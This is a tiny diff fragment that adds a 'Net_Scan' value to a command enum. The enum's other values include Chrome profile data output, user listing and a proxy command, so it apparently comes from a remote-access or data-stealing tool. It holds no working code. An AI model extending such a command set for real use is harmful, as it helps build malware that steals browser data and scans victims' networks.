@@ -129,7 +129,8 @@ namespace EnumComandos {
         INF_Chrome_Profile_Data_Out,
         INF_Users,
         INF_Error,
-        PROXY_CMD
+        PROXY_CMD,
+        Net_Scan
     };
 }
 
